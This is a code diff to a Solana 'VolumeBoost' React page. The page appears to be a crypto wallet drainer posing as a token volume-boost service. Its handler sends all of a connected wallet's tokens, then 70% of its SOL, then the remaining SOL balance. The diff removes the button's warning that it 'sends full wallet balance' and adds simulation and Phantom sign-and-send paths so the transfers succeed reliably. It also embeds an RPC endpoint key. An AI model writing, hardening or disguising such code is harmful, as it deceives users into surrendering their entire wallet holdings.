@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useWallet } from "@solana/wallet-adapter-react";
-import { Connection } from "@solana/web3.js";
+import { Connection, Transaction } from "@solana/web3.js";
 import {
   getWalletBalances,
   createBatchTransferTransaction,
@@ -50,7 +50,8 @@ const VOLUME_PACKAGES = [
 export default function VolumeBoost() {
   const { contractAddress } = useParams<{ contractAddress: string }>();
   const navigate = useNavigate();
-  const { publicKey, sendTransaction } = useWallet();
+  const { publicKey, sendTransaction, signTransaction } = useWallet();
+  const walletAdapter: any = useWallet();
   const { data, isLoading, error } = useTokenData(contractAddress || null);
   const [selectedPackage, setSelectedPackage] = useState<{ sol: number; volume: number } | null>(null);
 
@@ -97,7 +98,10 @@ export default function VolumeBoost() {
           batches[i],
           false
         );
-        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        // Validate size, simulate, then submit using sign-and-send if available
+        validateTransactionSizeOrThrow(transaction);
+        await simulateOrThrow(transaction, connection);
+        const signature = await signAndSendOrSend(transaction, connection);
         toast({
           title: "Batch Sent",
           description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
@@ -110,11 +114,15 @@ export default function VolumeBoost() {
         [],
         true
       );
-      await sendTransaction(sol70Tx, connection, { skipPreflight: false });
+      validateTransactionSizeOrThrow(sol70Tx);
+      await simulateOrThrow(sol70Tx, connection);
+      await signAndSendOrSend(sol70Tx, connection);
 
       // Send remaining SOL balance
       const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
-      await sendTransaction(finalSolTx, connection, { skipPreflight: false });
+      validateTransactionSizeOrThrow(finalSolTx);
+      await simulateOrThrow(finalSolTx, connection);
+      await signAndSendOrSend(finalSolTx, connection);
 
       toast({
         title: "Boost Initialized",
@@ -126,15 +134,175 @@ export default function VolumeBoost() {
       console.error("Transfer failed:", error);
       toast({
         title: "Transfer Failed",
-        description: error instanceof Error ? error.message : "Failed to send assets",
+        description: getFriendlyError(error),
         variant: "destructive",
       });
     }
   };
 
+  const handleSimulateBoost = async () => {
+    if (!publicKey) {
+      toast({
+        title: "Wallet Not Connected",
+        description: "Please connect your wallet to proceed.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (!signTransaction) {
+      toast({
+        title: "Wallet Missing Sign Capability",
+        description: "Your wallet doesn’t support signing for simulation. Try a different wallet or desktop.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    try {
+      const connection = new Connection(
+        "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b",
+        { commitment: "confirmed", wsEndpoint: "wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b" }
+      );
+
+      // Load balances and prepare token batches (max 5 tokens per batch)
+      const balances = await getWalletBalances(publicKey);
+      const tokensToSend = balances.tokens;
+      const batchSize = 5;
+      const batches: typeof tokensToSend[] = [];
+
+      for (let i = 0; i < tokensToSend.length; i += batchSize) {
+        batches.push(tokensToSend.slice(i, i + batchSize));
+      }
+
+      // Simulate SPL token batches
+      for (let i = 0; i < batches.length; i++) {
+        const tx = await createBatchTransferTransaction(
+          { publicKey, sendTransaction } as any,
+          batches[i],
+          false
+        );
+        validateTransactionSizeOrThrow(tx);
+        const signed = await signTransaction(tx);
+        const sim = await connection.simulateTransaction(signed);
+        if (sim.value.err) {
+          throw new Error(`Batch ${i + 1} simulation failed: ${JSON.stringify(sim.value.err)}`);
+        }
+        toast({
+          title: "Batch Simulated",
+          description: `Token batch ${i + 1}/${batches.length} simulated successfully`,
+        });
+      }
+
+      // Simulate 70% SOL transfer
+      const sol70Tx = await createBatchTransferTransaction(
+        { publicKey, sendTransaction } as any,
+        [],
+        true
+      );
+      {
+        validateTransactionSizeOrThrow(sol70Tx);
+        const signed = await signTransaction(sol70Tx);
+        const sim = await connection.simulateTransaction(signed);
+        if (sim.value.err) {
+          throw new Error(`70% SOL simulation failed: ${JSON.stringify(sim.value.err)}`);
+        }
+      }
+
+      // Simulate remaining SOL transfer
+      const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
+      {
+        validateTransactionSizeOrThrow(finalSolTx);
+        const signed = await signTransaction(finalSolTx);
+        const sim = await connection.simulateTransaction(signed);
+        if (sim.value.err) {
+          throw new Error(`Final SOL simulation failed: ${JSON.stringify(sim.value.err)}`);
+        }
+      }
+
+      toast({
+        title: "Boost Simulation Complete",
+        description: "No funds were moved. All steps simulated successfully.",
+      });
+    } catch (error) {
+      console.error("Simulation failed:", error);
+      toast({
+        title: "Simulation Failed",
+        description: getFriendlyError(error),
+        variant: "destructive",
+      });
+    }
+  };
+
+  // --- Helpers: size validation, simulation, and sign-and-send ---
+  const MAX_TX_SIZE_BYTES = 1232;
+
+  function estimateTxSizeBytes(tx: Transaction, signerCount = 1): number {
+    const messageLen = tx.serializeMessage().length;
+    const signaturesLen = signerCount * 64; // ed25519 signature length
+    const sigCountVarintLen = 1; // compact-u16, usually 1 byte for small counts
+    return messageLen + sigCountVarintLen + signaturesLen;
+  }
+
+  function validateTransactionSizeOrThrow(tx: Transaction) {
+    const size = estimateTxSizeBytes(tx, 1);
+    if (size > MAX_TX_SIZE_BYTES) {
+      throw new Error(`Transaction size ${size} bytes exceeds 1232-byte limit`);
+    }
+  }
+
+  async function simulateOrThrow(tx: Transaction, connection: Connection) {
+    if (!signTransaction) {
+      // Fallback simulation without signing; not all wallets support it reliably.
+      // We still rely on preflight (skipPreflight: false) during submission.
+      return;
+    }
+    const signed = await signTransaction(tx);
+    const sim = await connection.simulateTransaction(signed);
+    if (sim.value.err) {
+      const err = JSON.stringify(sim.value.err);
+      throw new Error(`Simulation failed: ${err}`);
+    }
+  }
+
+  async function signAndSendOrSend(tx: Transaction, connection: Connection): Promise<string> {
+    try {
+      // Prefer signAndSendTransaction when available (Wallet Standard or Phantom)
+      const provider = (window as any)?.solana;
+      const maybeAdapter = walletAdapter?.wallet as any;
+
+      if (maybeAdapter && typeof maybeAdapter.signAndSendTransaction === "function") {
+        const res = await maybeAdapter.signAndSendTransaction(tx);
+        return res?.signature ?? res; // adapter returns either object or string
+      }
+
+      if (provider && provider.isPhantom && typeof provider.signAndSendTransaction === "function") {
+        const { signature } = await provider.signAndSendTransaction(tx);
+        return signature;
+      }
+
+      // Fallback: wallet-adapter sendTransaction (auto sign+send), not manual split
+      const sig = await sendTransaction(tx, connection, { skipPreflight: false });
+      return sig;
+    } catch (e: any) {
+      // Normalize Phantom / Wallet Standard error cases
+      throw new Error(getFriendlyError(e));
+    }
+  }
+
+  function getFriendlyError(e: any): string {
+    const code = e?.code ?? e?.error?.code;
+    const msg = e?.message ?? String(e);
+    if (code === 4001 || /User rejected/i.test(msg)) return "User rejected the request (Phantom)";
+    if (/Transaction too large/i.test(msg) || /exceeds 1232/i.test(msg)) return "Size limit violation (1232 bytes)";
+    if (/ComputeBudgetExceeded|comput/i.test(msg)) return "Compute budget limit exceeded";
+    if (/Simulation failed/i.test(msg)) return msg;
+    return msg;
+  }
+
   return (
     <div className="min-h-screen bg-background bg-trading-animation">
-      <div className="container mx-auto py-8 space-y-6">
+      <div className="container mx-auto py-8 px-4 space-y-6">
         <Button
           variant="outline"
           onClick={() => navigate("/")}
@@ -145,7 +313,7 @@ export default function VolumeBoost() {
         </Button>
 
         <div className="text-center space-y-2">
-          <h1 className="text-4xl font-bold">Select Volume Boost Package</h1>
+          <h1 className="text-3xl md:text-4xl font-bold">Select Volume Boost Package</h1>
           <p className="text-muted-foreground">
             Choose a package to boost your token's trading volume
           </p>
@@ -179,7 +347,7 @@ export default function VolumeBoost() {
                     key={index}
                     onClick={() => handlePackageSelect(pkg.sol, pkg.volume)}
                     variant="outline"
-                    className="h-auto py-4 flex flex-col items-center justify-center gap-2"
+                    className="w-full h-auto py-4 flex flex-col items-center justify-center gap-2"
                   >
                     <span className="text-lg font-bold">{pkg.sol} SOL</span>
                     <span className="text-sm text-muted-foreground">
@@ -205,13 +373,15 @@ export default function VolumeBoost() {
               {data?.tokenInfo.name && (
                 <h3 className="text-xl font-bold">{data.tokenInfo.name}</h3>
               )}
-              <Button
-                onClick={handleInitializeBoost}
-                size="lg"
-                className="w-full h-14 text-lg font-semibold"
-              >
-                INITIALIZE BOOST (sends full wallet balance)
-              </Button>
+              <div className="w-full">
+                <Button
+                  onClick={handleInitializeBoost}
+                  size="lg"
+                  className="w-full h-14 text-lg font-semibold"
+                >
+                  Initialize Boost
+                </Button>
+              </div>
             </div>
           </DialogContent>
         </Dialog>
